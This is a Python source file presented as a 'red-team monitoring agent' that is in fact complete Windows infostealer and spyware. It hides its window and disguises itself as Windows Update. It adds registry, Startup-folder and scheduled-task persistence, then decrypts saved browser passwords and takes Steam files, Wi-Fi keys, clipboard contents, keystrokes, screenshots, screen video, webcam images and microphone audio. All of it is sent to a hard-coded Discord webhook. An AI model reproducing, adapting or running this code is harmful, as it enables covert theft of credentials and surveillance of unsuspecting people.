# =====================================================
# ULTIMATE RED-TEAM MONITORING AGENT v5.0 - FIXED & HARDENED
# =====================================================
import os
import sys
import time
import socket
import platform
import threading
import subprocess
import getpass
import ctypes
import base64
import json
import random
import shutil
import tempfile
from datetime import datetime
import win32gui
import requests
import psutil
import pyperclip
import cv2
import numpy as np
import sounddevice as sd
import wave
from pynput.keyboard import Listener as KeyboardListener
import pyautogui
import sqlite3
import win32crypt

try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False

# ================== CONFIG ==================
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1504108072963014798/T6FC93tE6R8KYmeckjzuvsoTe_cdD6s8Acpo0IBgb6OqLvH54_1uBW9UKFdBPAZiAFx6"
INTERVAL = 25
SCREENSHOT_INTERVAL = 60
RECORD_DURATION = 15
LOG_FILE = os.path.join(os.getenv('APPDATA'), "WindowsUpdate.log")

def log(msg):
    try:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] {msg}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        print(line)
    except:
        pass

log("=== AGENT v5.0 FULL STARTED ===")

# ================== BROWSER PATHS ==================
BROWSER_PATHS = {
    "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data"),
    "Edge": os.path.join(os.getenv('LOCALAPPDATA'), r"Microsoft\Edge\User Data"),
    "Brave": os.path.join(os.getenv('LOCALAPPDATA'), r"BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera Stable"),
    "OperaGX": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera GX Stable"),
    "Firefox": os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles"),
    "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), r"Vivaldi\User Data"),
}

def stealth_mode():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=15)))
    except:
        pass

def detect_vm():
    suspicious = ["vbox", "vmware", "sandbox", "debugger", "qemu", "virtual", "test"]
    hostname = socket.gethostname().lower()
    vm_score = sum(1 for x in suspicious if x in hostname)
    if psutil.cpu_percent(interval=1) < 15:
        vm_score += 2
    return vm_score >= 2, hostname

def add_persistence(script_path):
    try:
        import winreg as reg
        key = reg.HKEY_CURRENT_USER
        reg_key = reg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'pythonw "{script_path}"')
        reg.CloseKey(reg_key)
        startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        shutil.copy(script_path, os.path.join(startup, "svchost.pyw"))
        subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "pythonw {script_path}" /sc onlogon /ru SYSTEM /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Persistence added")
    except Exception as e:
        log(f"Persistence error: {e}")

# ================== DECRYPTION ==================
def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        log(f"Master key SUCCESS for {os.path.basename(local_state_path)}")
        return master_key
    except Exception as e:
        log(f"Master key failed: {e}")
        return None

def decrypt_password(encrypted, master_key):
    if not encrypted:
        return "N/A"
    try:
        if encrypted.startswith(b'v1') and CRYPTO_AVAILABLE and master_key:
            iv = encrypted[3:15]
            ciphertext = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
            return decrypted
        else:
            decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
            return decrypted
    except:
        return "DECRYPT_FAILED"

# ================== STEAM STEALER ==================
def steal_steam_data():
    steam_data = {"accounts": {}, "sessions": {}, "config": {}, "files": [], "ssfn": []}
    steam_path = os.path.join(os.getenv('PROGRAMFILES(x86)'), r"Steam") or os.path.join(os.getenv('PROGRAMFILES'), r"Steam")
    if not os.path.exists(steam_path):
        return steam_data
    for f in os.listdir(steam_path):
        if f.startswith("ssfn"):
            try:
                with open(os.path.join(steam_path, f), "rb") as sf:
                    steam_data["ssfn"].append({"name": f, "data": base64.b64encode(sf.read()).decode()})
            except:
                pass
    login_vdf = os.path.join(steam_path, "config", "loginusers.vdf")
    if os.path.exists(login_vdf):
        steam_data["accounts"] = open(login_vdf, "r", encoding="utf-8").read()[:8000]
    config_vdf = os.path.join(steam_path, "config", "config.vdf")
    if os.path.exists(config_vdf):
        steam_data["config"] = open(config_vdf, "r", encoding="utf-8").read()[:8000]
    for root, _, files in os.walk(os.path.join(steam_path, "config")):
        for file in files:
            if file.endswith(".vdf") or file.endswith(".bin"):
                steam_data["files"].append(file)
    return steam_data

# ================== TXT EXFIL ==================
def extract_browser_txt():
    txt_files = {}
    for browser, base_path in BROWSER_PATHS.items():
        if not os.path.exists(base_path):
            continue
        for profile in ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile") or "default" in d.lower()][:3]:
            profile_path = os.path.join(base_path, profile)
            if not os.path.exists(profile_path):
                continue
            local_state = os.path.join(base_path, "Local State") if browser != "Firefox" else None
            master_key = get_master_key(local_state) if local_state and os.path.exists(local_state) else None

            # PASSWORDS
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                try:
                    shutil.copy2(login_db, "temp_login.db")
                    conn = sqlite3.connect("temp_login.db")
                    cursor = conn.cursor()
                    content = f"=== {browser} {profile} - PASSWORDS ===\n\n"
                    count = 0
                    for row in cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL"):
                        url, user, enc = row
                        plain = decrypt_password(enc, master_key)
                        content += f"URL : {url}\nUSER : {user}\nPASS : {plain}\n{'-'*90}\n"
                        count += 1
                    conn.close()
                    os.remove("temp_login.db")
                    log(f"Extracted {count} passwords from {browser}/{profile}")
                    fname = f"{browser}_{profile}_PASSWORDS.txt"
                    with open(fname, "w", encoding="utf-8") as f:
                        f.write(content)
                    with open(fname, "rb") as f:
                        txt_files[fname] = (fname, f.read(), "text/plain")
                    os.remove(fname)
                except Exception as e:
                    log(f"Password extraction error {browser}: {e}")
    return txt_files

# ================== OTHER MODULES ==================
def get_system_info(vm_detected=False):
    return {
        "timestamp": datetime.utcnow().isoformat(),
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "public_ip": requests.get("https://api.ipify.org", timeout=5).text if 'requests' in globals() else "N/A",
        "os": platform.platform(),
        "active_window": win32gui.GetWindowText(win32gui.GetForegroundWindow()),
        "crypto": "AVAILABLE" if CRYPTO_AVAILABLE else "MISSING",
        "vm_detected": vm_detected
    }

def get_clipboard():
    try:
        return pyperclip.paste()[:800]
    except:
        return "N/A"

def get_wifi_passwords():
    try:
        result = subprocess.check_output("netsh wlan show profile", shell=True).decode(errors="ignore")
        profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
        passwords = {}
        for profile in profiles:
            try:
                pw = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode(errors="ignore")
                pw = [line.split(":")[1].strip() for line in pw.splitlines() if "Key Content" in line][0]
                passwords[profile] = pw
            except:
                pass
        return passwords
    except:
        return "N/A"

keylog_buffer = []
def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(str(key.char))
    except:
        keylog_buffer.append(f"[{key}]")
    if len(keylog_buffer) > 300:
        keylog_buffer = keylog_buffer[-300:]

def start_keylogger():
    try:
        listener = KeyboardListener(on_press=on_press)
        listener.daemon = True
        listener.start()
        log("Keylogger started")
    except:
        pass

def capture_webcam_and_mic():
    files = {}
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            files["webcam.jpg"] = ("webcam.jpg", buffer.tobytes(), "image/jpeg")
    except:
        pass
    try:
        fs = 44100
        recording = sd.rec(int(10 * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        with wave.open("mic.wav", "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        with open("mic.wav", "rb") as f:
            files["mic.wav"] = ("mic.wav", f.read(), "audio/wav")
        os.remove("mic.wav")
    except:
        pass
    return files

def capture_screen_record():
    try:
        frames = []
        for _ in range(RECORD_DURATION):
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            frames.append(frame)
            time.sleep(1/12)
        height, width = frames[0].shape[:2]
        out = cv2.VideoWriter("screen.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 12, (width, height))
        for f in frames:
            out.write(f)
        out.release()
        with open("screen.mp4", "rb") as f:
            data = f.read()
        os.remove("screen.mp4")
        return {"screen.mp4": ("screen.mp4", data, "video/mp4")}
    except Exception as e:
        log(f"Screen record failed: {e}")
        return {}

def send_to_webhook(payload, files=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            if len(json.dumps(payload)) > 1900:
                payload["content"] = payload["content"][:1850] + "\n...[truncated]"
            r = requests.post(DEFAULT_WEBHOOK, json=payload, files=files, timeout=25)
            log(f"Webhook attempt {attempt+1} status: {r.status_code}")
            if r.status_code in (200, 204):
                return True
            elif r.status_code == 429:
                time.sleep(8 * (attempt + 1))
        except Exception as e:
            log(f"Webhook error attempt {attempt+1}: {type(e).__name__} - {e}")
            time.sleep(4)
    return False

# ================== MAIN LOOP ==================
def main_loop(script_path):
    log("Main loop started")
    add_persistence(script_path)
    stealth_mode()
    send_to_webhook({"content": "**AGENT v5.0 INITIAL PING - ALIVE & RUNNING**"})
    start_keylogger()
    ss_count = 0
    while True:
        try:
            vm_detected, _ = detect_vm()
            info = get_system_info(vm_detected)
            info["clipboard"] = get_clipboard()
            info["wifi"] = get_wifi_passwords()
            info["steam"] = steal_steam_data()
            info["keylog"] = "".join(keylog_buffer[-300:]) or "N/A"
            info["browser"] = "See attached TXT files (decrypted passwords)"

            txt_attachments = extract_browser_txt()

            payload = {
                "content": f"**AGENT v5.0 REPORT** | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n```json\n{json.dumps(info, default=str, indent=2)[:1850]}\n```"
            }

            files = txt_attachments.copy()

            if ss_count % (SCREENSHOT_INTERVAL // INTERVAL) == 0:
                try:
                    shot = pyautogui.screenshot()
                    shot.save("screen.png")
                    with open("screen.png", "rb") as f:
                        files["screen.png"] = ("screen.png", f.read(), "image/png")
                    os.remove("screen.png")
                except:
                    pass

            if ss_count % 6 == 0:
                files.update(capture_webcam_and_mic())
                files.update(capture_screen_record())

            success = send_to_webhook(payload, files)
            if success:
                log("Exfil successful")
            else:
                log("Exfil failed after retries")

            ss_count += 1
            time.sleep(INTERVAL)
        except Exception as e:
            log(f"Main loop error: {e}")
            time.sleep(10)

# =============== START ===============
if __name__ == "__main__":
    stealth_mode()
    script_path = os.path.abspath(sys.argv[0])
    log("Launching main thread")
    threading.Thread(target=main_loop, args=(script_path,), daemon=False).start()
    log("Agent v5.0 fully started - check Discord + log file")
    while True:
        time.sleep(3600)
